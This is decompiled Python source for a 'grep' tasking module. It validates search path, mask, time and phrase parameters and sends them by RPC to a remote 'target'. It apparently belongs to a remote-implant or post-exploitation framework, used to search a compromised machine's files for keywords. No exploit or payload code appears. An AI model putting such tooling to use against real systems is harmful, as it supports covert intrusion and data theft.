# uncompyle6 version 2.9.10
# Python bytecode 2.7 (62211)
# Decompiled from: Python 2.7.10 (default, Feb  6 2017, 23:53:20) 
# [GCC 4.2.1 Compatible Apple LLVM 8.0.0 (clang-800.0.34)]
# Embedded file name: Mcl_Cmd_Grep_Tasking.py
TIME_TYPE_ACCESSED = 1
TIME_TYPE_MODIFIED = 2
TIME_TYPE_CREATED = 3
MIN_SECONDS_FOR_AGE = 25

def TaskingMain(namespace):
    import mcl.imports
    import mcl.target
    import mcl.tasking
    import mcl.tasking.virtualdir
    from mcl.object.MclTime import MclTime
    from mcl.object.Message import MarshalMessage
    mcl.imports.ImportWithNamespace(namespace, 'mca.file.cmd.grep', globals())
    mcl.imports.ImportWithNamespace(namespace, 'mca.file.cmd.grep.tasking', globals())
    lpParams = mcl.tasking.GetParameters()
    try:
        path, mask = mcl.tasking.virtualdir.GetMaskAndPath(lpParams['path_and_mask'], lpParams['mask'], lpParams['path'])
    except RuntimeError as err:
        mcl.tasking.EchoError(str(err))
        return False

    try:
        path = mcl.tasking.virtualdir.GetFullPath(path)
    except:
        mcl.tasking.EchoError('Failed to get full path')
        return False

    if lpParams['age'].GetTimeType() != lpParams['age'].MCL_TIME_TYPE_INVALID:
        if lpParams['after'].GetTimeType() != lpParams['after'].MCL_TIME_TYPE_INVALID or lpParams['before'].GetTimeType() != lpParams['before'].MCL_TIME_TYPE_INVALID:
            mcl.tasking.EchoError('Age and before/after times are mutually exclusive')
            return False
        if lpParams['age'].GetSeconds() < MIN_SECONDS_FOR_AGE:
            mcl.tasking.EchoError('An age of %d second(s) is too small' % lpParams['age'].GetSeconds())
            return False
    tgtParams = mca.file.cmd.grep.Params()
    tgtParams.mask = mask
    tgtParams.path = path
    if lpParams['timetype'] == TIME_TYPE_ACCESSED:
        tgtParams.dateType = mca.file.cmd.grep.PARAM_TIME_TYPE_ACCESSED
    elif lpParams['timetype'] == TIME_TYPE_MODIFIED:
        tgtParams.dateType = mca.file.cmd.grep.PARAM_TIME_TYPE_MODIFIED
    elif lpParams['timetype'] == TIME_TYPE_CREATED:
        tgtParams.dateType = mca.file.cmd.grep.PARAM_TIME_TYPE_CREATED
    else:
        mcl.tasking.EchoError('Invalid time type specified')
        return False
    tgtParams.maxEntries = lpParams['max']
    if lpParams['recursive']:
        tgtParams.flags |= mca.file.cmd.grep.PARAMS_FLAG_RECURSIVE
    if lpParams['nocase']:
        tgtParams.flags |= mca.file.cmd.grep.PARAMS_FLAG_NOCASE
    if lpParams['listall']:
        tgtParams.flags |= mca.file.cmd.grep.PARAMS_FLAG_LISTALL
    if lpParams['unicode']:
        tgtParams.flags |= mca.file.cmd.grep.PARAMS_FLAG_UNICODE
    tgtParams.age = lpParams['age']
    tgtParams.afterTime = lpParams['after']
    tgtParams.beforeTime = lpParams['before']
    if lpParams['phrase'] != None:
        phrases = lpParams['phrase']
    else:
        phrases = ''
    numPhrases = 0
    while len(phrases) > 0:
        if numPhrases >= mca.file.cmd.grep.PARAMS_MAX_SEARCH_PHRASES:
            mcl.tasking.EchoError('Exceeded maximum search phrases (%u)' % PARAMS_MAX_SEARCH_PHRASES)
            return False
        pos = phrases.find('|')
        if pos == -1:
            tgtParams.phrases[numPhrases] = phrases
            phrases = ''
        else:
            tgtParams.phrases[numPhrases] = phrases[0:pos]
            phrases = phrases[pos + 1:]
        if len(tgtParams.phrases[numPhrases]) > 0:
            numPhrases = numPhrases + 1

    if numPhrases == 0:
        mcl.tasking.EchoError('At least one phrase must be specified')
        return False
    else:
        rpc = mca.file.cmd.grep.tasking.RPC_INFO_GREP
        msg = MarshalMessage()
        tgtParams.Marshal(msg)
        rpc.SetData(msg.Serialize())
        rpc.SetMessagingType('message')
        taskXml = mcl.tasking.Tasking()
        taskXml.AddSearchMask(tgtParams.mask)
        taskXml.AddSearchPath(tgtParams.path)
        taskXml.SetSearchTimeAfter(tgtParams.afterTime)
        taskXml.SetSearchTimeBefore(tgtParams.beforeTime)
        taskXml.SetSearchTimeAge(tgtParams.age)
        i = 0
        while i < numPhrases:
            taskXml.AddSearchParam(tgtParams.phrases[i])
            i = i + 1

        if tgtParams.flags & mca.file.cmd.grep.PARAMS_FLAG_RECURSIVE:
            taskXml.SetRecursive()
        if tgtParams.maxEntries > 0:
            taskXml.SetMaxMatches(tgtParams.maxEntries)
        type = ''
        if tgtParams.flags & mca.file.cmd.grep.PARAMS_FLAG_NOCASE:
            if len(type) > 0:
                type = type + '_'
            type = type + 'NOCASE'
        if tgtParams.flags & mca.file.cmd.grep.PARAMS_FLAG_LISTALL:
            if len(type) > 0:
                type = type + '_'
            type = type + 'LISTALL'
        if tgtParams.flags & mca.file.cmd.grep.PARAMS_FLAG_UNICODE:
            if len(type) > 0:
                type = type + '_'
            type = type + 'UNICODE'
        if len(type) > 0:
            taskXml.SetType(type)
        mcl.tasking.OutputXml(taskXml.GetXmlObject())
        res = mcl.tasking.RpcPerformCall(rpc)
        if res != mcl.target.CALL_SUCCEEDED:
            mcl.tasking.RecordModuleError(res, 0, mca.file.cmd.grep.errorStrings)
            return False
        return True


if __name__ == '__main__':
    import sys
    if TaskingMain(sys.argv[1]) != True:
        sys.exit(-1)